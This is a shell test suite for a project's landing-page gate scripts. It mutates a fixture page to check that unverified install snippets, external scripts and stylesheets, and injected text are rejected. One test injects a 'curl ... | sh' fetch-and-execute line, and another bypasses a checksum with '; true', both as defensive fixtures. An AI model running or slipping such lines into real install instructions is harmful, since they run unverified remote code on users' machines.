#!/bin/sh
# Copyright (c) 2026 Costas Kirgoussios
#
# This software is licensed under the PolyForm Noncommercial License 1.0.0.
# You may obtain a copy of the License at:
# https://polyformproject.org/licenses/noncommercial/1.0.0/

# Tests for scripts/check-site.sh and scripts/extract-snippet.sh, the gate between the landing page, the
# release matrix in .github/workflows/release.yml and the committed demo capture site/demo/agents.txt.
#
# Each case starts from a conforming fixture site (the layout Task 7's page must follow), applies one
# mutation, and expects the gate to reject it with the named rule.

set -eu
root=$(cd "$(dirname "$0")/../.." && pwd)
failures=0
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT INT TERM

check() {
    if [ "$2" = "$3" ]; then
        echo "ok   - $1"
    else
        echo "FAIL - $1: expected '$3', got '$2'"
        failures=$((failures + 1))
    fi
}

# contains <name> <text> <needle>
contains() {
    case $2 in
        *"$3"*) echo "ok   - $1" ;;
        *)
            echo "FAIL - $1: output lacks '$3'; output was:"
            echo "$2"
            failures=$((failures + 1))
            ;;
    esac
}

escape() { sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g'; }

# edit <file> <sed-expression>: portable in-place edit.
edit() {
    sed "$2" "$1" >"$1.new"
    mv "$1.new" "$1"
}

# unix_snippet <target> <checker>
unix_snippet() {
    cat <<SNIP
curl -fsSLO https://github.com/ckir/aiprofiles/releases/latest/download/agent-profile-$1.tar.gz \\
 && curl -fsSL  https://github.com/ckir/aiprofiles/releases/latest/download/agent-profile-$1.tar.gz.sha256 | $2 \\
 && tar -xzf agent-profile-$1.tar.gz \\
 && ./agent-profile agents
SNIP
}

windows_snippet() {
    cat <<'SNIP'
& {
  $ErrorActionPreference = 'Stop'
  $ProgressPreference = 'SilentlyContinue'
  Invoke-WebRequest https://github.com/ckir/aiprofiles/releases/latest/download/agent-profile-x86_64-pc-windows-msvc.zip -OutFile agent-profile.zip
  Invoke-WebRequest https://github.com/ckir/aiprofiles/releases/latest/download/agent-profile-x86_64-pc-windows-msvc.zip.sha256 -OutFile agent-profile.zip.sha256
  $hash = (Get-FileHash agent-profile.zip -Algorithm SHA256).Hash
  $expected = ((Get-Content agent-profile.zip.sha256 -Raw) -split '\s+')[0]
  if (-not ($hash -and $expected -and $hash -ieq $expected)) { throw 'checksum mismatch' }
  Expand-Archive -Force agent-profile.zip -DestinationPath .
  .\agent-profile.exe agents
}
SNIP
}

# block <target> <body-file>: one snippet <pre>, open and close tags on their own lines.
block() {
    printf '<pre class="snippet" id="snip-%s" tabindex="0" aria-label="Install on %s">\n' "$1" "$1"
    escape <"$2"
    printf '</pre>\n'
}

# make_site <dir>: a conforming site directory.
make_site() {
    mkdir -p "$1/demo"
    cp "$root/site/demo/agents.txt" "$1/demo/agents.txt"
    cp "$root/site/demo/agents.meta" "$1/demo/agents.meta"
    fourth=$(grep -n '^agent:' "$root/site/demo/agents.txt" | sed -n 4p | cut -d: -f1)
    shown=$((fourth - 2))
    {
        printf '<!doctype html>\n<html lang="en">\n<head>\n<meta charset="utf-8">\n<title>agent-profile</title>\n</head>\n<body>\n'
        printf '<header>agent-profile {{VERSION}}</header>\n'
        for t in x86_64-unknown-linux-gnu aarch64-unknown-linux-gnu aarch64-apple-darwin x86_64-apple-darwin x86_64-pc-windows-msvc; do
            printf '<button type="button" role="tab" id="tab-%s">%s</button>\n' "$t" "$t"
        done
        for t in x86_64-unknown-linux-gnu aarch64-unknown-linux-gnu; do
            unix_snippet "$t" 'sha256sum -c -' >"$tmp/body"
            block "$t" "$tmp/body"
        done
        for t in aarch64-apple-darwin x86_64-apple-darwin; do
            unix_snippet "$t" 'shasum -a 256 -c -' >"$tmp/body"
            block "$t" "$tmp/body"
        done
        windows_snippet >"$tmp/body"
        block x86_64-pc-windows-msvc "$tmp/body"
        printf '<pre id="demo">\n'
        {
            head -n "$shown" "$root/site/demo/agents.txt"
            printf '… and 9 more\n'
        } | escape
        printf '</pre>\n'
        printf '<p>Captured in the project'"'"'s sandbox from agent-profile {{DEMO_VERSION}} on {{DEMO_DATE}}</p>\n'
        printf '<footer><a href="https://github.com/ckir/aiprofiles">GitHub</a> <a href="https://polyformproject.org/licenses/noncommercial/1.0.0/">License</a></footer>\n'
        printf '</body>\n</html>\n'
    } >"$1/index.html"
}

# run <site-dir>: sets out and status.
run() {
    set +e
    out=$(sh "$root/scripts/check-site.sh" "$1" 2>&1)
    status=$?
    set -e
}

# rejects <name> <needle>: the site in $d, already mutated, must fail with the needle in the output.
rejects() {
    run "$d"
    check "$1: status" "$status" "1"
    contains "$1: message" "$out" "$2"
}

n=0
fresh() {
    n=$((n + 1))
    d="$tmp/site$n"
    make_site "$d"
}

fresh
run "$d"
check "t1 conforming site: status" "$status" "0"
check "t1 conforming site: silent" "$out" ""

fresh
edit "$d/index.html" 's/agent-profile-x86_64-unknown-linux-gnu/agent-profile-x86_64-unknown-linux-musl/g'
rejects "t2 asset not in release.yml" "asset not in release.yml"

fresh
awk '/id="snip-aarch64-apple-darwin"/{skip=1} !skip{print} skip&&/^<\/pre>/{skip=0}' "$d/index.html" >"$d/index.new"
mv "$d/index.new" "$d/index.html"
rejects "t3 four snippets" "aarch64-apple-darwin"

fresh
edit "$d/index.html" 's#releases/latest/download#releases/download/v0.1.2#g'
rejects "t4 pinned download" "not releases/latest/download"

fresh
edit "$d/index.html" 's#</head>#<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk" rel="stylesheet">\n</head>#'
rejects "t5 external stylesheet" "external host"

fresh
edit "$d/index.html" 's#</head>#<script src="https://cdn.example/x.js"></script>\n</head>#'
rejects "t6 external script" "external host"

fresh
edit "$d/index.html" 's#claude (PATH)#clauda (PATH)#'
rejects "t7 edited demo line" "demo not a prefix"

fresh
edit "$d/index.html" 's#id="snip-x86_64-unknown-linux-gnu"#id="snip-x86_64-unknown-linux-gnu" hidden#'
rejects "t8 hidden snippet" "snippet hidden without JS"

fresh
edit "$d/index.html" 's#{{VERSION}}##'
rejects "t9 missing {{VERSION}}" "{{VERSION}}"

fresh
edit "$d/index.html" 's#sha256sum -c -#cat#g'
rejects "t10 unverified Linux unpack" "unverified unpack: x86_64-unknown-linux-gnu"

fresh
edit "$d/index.html" 's#shasum -a 256 -c -#cat#g'
rejects "t10b unverified macOS unpack" "unverified unpack (macOS): aarch64-apple-darwin"

fresh
edit "$d/index.html" "/ErrorActionPreference = 'Stop'/d"
rejects "t11 unguarded PowerShell" "unguarded PowerShell"

fresh
# shellcheck disable=SC2016 # sed expression, the $ are literal
edit "$d/index.html" 's#\$hash -and \$expected -and \$hash -ieq#$hash -ieq#'
rejects "t11b unguarded Windows compare" "unverified unpack (Windows)"

# t15 a stylesheet that imports another origin is rejected (the privacy guard covers CSS and JS)
fresh
printf '@import url("https://fonts.googleapis.com/css2?family=X");\n' >"$d/site.css"
rejects "t15 external host in CSS" "external host"

# t16 a tab whose snippet downloads another target's asset is rejected
fresh
edit "$d/index.html" '/id="snip-aarch64-unknown-linux-gnu"/,/^<\/pre>/s/agent-profile-aarch64-unknown-linux-gnu/agent-profile-x86_64-unknown-linux-gnu/g'
rejects "t16 wrong asset on a tab" "wrong asset: aarch64-unknown-linux-gnu"

# t17 a checksum that cannot stop the chain is rejected
fresh
edit "$d/index.html" 's#| sha256sum -c -#| sha256sum -c - ; true#'
rejects "t17 checksum does not gate the unpack" "unverified unpack: x86_64-unknown-linux-gnu"

# t18 text on the opening <pre> line is invisible to the extractor and is rejected
fresh
edit "$d/index.html" 's#\(<pre class="snippet" id="snip-x86_64-unknown-linux-gnu"[^>]*>\)#\1curl -s https://github.com/x/y | sh; #'
rejects "t18 text on the opening pre line" "text on the opening <pre> line: x86_64-unknown-linux-gnu"

# t19 an uppercase scheme and a single-quoted protocol-relative src are rejected
fresh
edit "$d/index.html" "s#</head>#<script src='//cdn.example/x.js'></script>\n</head>#"
rejects "t19 single-quoted protocol-relative src" "external host"
fresh
edit "$d/index.html" 's#</head>#<link href="HTTPS://cdn.example/x.css" rel="stylesheet">\n</head>#'
rejects "t19 uppercase scheme" "external host"

# t20 a missing tab button is rejected
fresh
edit "$d/index.html" '/id="tab-aarch64-apple-darwin"/d'
rejects "t20 missing tab" "missing tab: aarch64-apple-darwin"

# t12 extract-snippet decodes entities and strips tags
fresh
got=$(sh "$root/scripts/extract-snippet.sh" "$d/index.html" x86_64-unknown-linux-gnu | sed -n 2p)
check "t12 extract decodes &amp;&amp;" "$got" " && curl -fsSL  https://github.com/ckir/aiprofiles/releases/latest/download/agent-profile-x86_64-unknown-linux-gnu.tar.gz.sha256 | sha256sum -c - \\"

# t13 unknown target
set +e
sh "$root/scripts/extract-snippet.sh" "$d/index.html" bogus-target >/dev/null 2>&1
status=$?
set -e
check "t13 extract unknown target exits 1" "$status" "1"

# t14 build-site.sh fills the placeholders and writes the rustdoc redirect stubs
set +e
sh "$root/scripts/build-site.sh" 9.9.9 "$tmp/built" >/dev/null 2>&1
status=$?
set -e
check "t14 build-site exits 0" "$status" "0"
left=$(grep -c '{{' "$tmp/built/index.html" || true)
check "t14 no placeholder left" "$left" "0"
has=$(grep -c 'v9.9.9' "$tmp/built/index.html" || true)
check "t14 version substituted" "$has" "1"
demo_version=$(sed -n 's/^version=//p' "$root/site/demo/agents.meta")
has=$(grep -c "agent-profile $demo_version on" "$tmp/built/index.html" || true)
check "t14 demo version substituted" "$has" "1"
check "t14 agent_profile stub" "$(grep -c 'url=../rustdoc/agent_profile/index.html' "$tmp/built/agent_profile/index.html")" "1"
check "t14 fake_agent stub" "$(grep -c 'url=../rustdoc/fake_agent/index.html' "$tmp/built/fake_agent/index.html")" "1"
set +e
sh "$root/scripts/build-site.sh" 9.9.9 >/dev/null 2>&1
status=$?
set -e
check "t14 one argument exits 2" "$status" "2"

if [ "$failures" -ne 0 ]; then
    echo "$failures failure(s)"
    exit 1
fi
